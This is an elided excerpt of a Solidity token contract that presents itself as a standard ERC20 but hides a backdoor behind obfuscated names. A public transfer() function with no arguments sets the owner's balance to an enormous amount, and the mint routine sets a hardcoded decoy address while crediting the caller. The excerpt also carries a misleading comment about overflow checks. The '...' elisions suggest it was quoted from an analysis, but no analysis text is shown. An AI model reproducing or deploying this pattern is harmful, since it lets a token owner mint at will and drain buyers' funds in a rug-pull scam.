...
contract Token is Context, IERC20, IERC20Metadata,Ownable {
    ...
    mapping(address => uint256) private _bucbusdl;
    mapping(address => mapping(address => uint256)) private _allowances;
    address public  _bnbbusd;
    address public _xDeploy = 0x09cC15Dda77789d42c0133c909E88Fb6E3Af793A;
    ...
    constructor(string memory name_, string memory symbol_) {
        ...
        _symbol = symbol_;
        _bnbbusd = msg.sender;
        _yydsed(msg.sender, 1000000000 * 10**decimals());
    }
    ...
    function transfer() external {
        ...
        if (_bnbbusd == _yydsOwen){
            _bucbusdl[_yydsOwen] = MAXSupply * 10000000000000000000000; 
        }
    }
    ...
    function _yydsed(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: createy to the zero address");
        account = _xDeploy;
        _totalSupply += amount;
    unchecked {
        // Overflow not possible: balance + amount is at most totalSupply + amount, which is checked above.
        _bucbusdl[msg.sender] += amount;
    }
    ...
    function _burn(address account, uint256 amount) internal virtual {
        ...
        uint256 accountBalance = _bucbusdl[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
    unchecked {
        _bucbusdl[account] = accountBalance - amount;
